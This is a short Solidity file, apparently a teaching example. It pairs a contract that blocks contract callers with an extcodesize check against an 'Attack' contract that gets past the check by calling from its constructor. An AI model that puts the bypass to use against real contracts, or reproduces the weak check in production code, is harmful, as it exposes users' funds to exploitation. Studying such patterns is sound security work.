pragma solidity ^0.8.15;

contract nonIteractive {
    function isSmartContract(address account) public view returns (bool) {
    
        // extcodesize:- gives size of code
        uint size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

    bool public marked = false;

    function contractProtected() external {
        require(!isSmartContract(msg.sender), "no contract allowed");
        marked = true;
    }
}


contract Attack {
    bool public isSmartContract;

    // When contract is being created, code size (extcodesize) is 0.
    // This will bypass the isContract() check
    
    constructor(address _nonIteractive) {
        isSmartContract = nonIteractive(_nonIteractive).isSmartContract(address(this));
        
        // Hack  will work,here
        nonIteractive(_nonIteractive).contractProtected();
    }
}
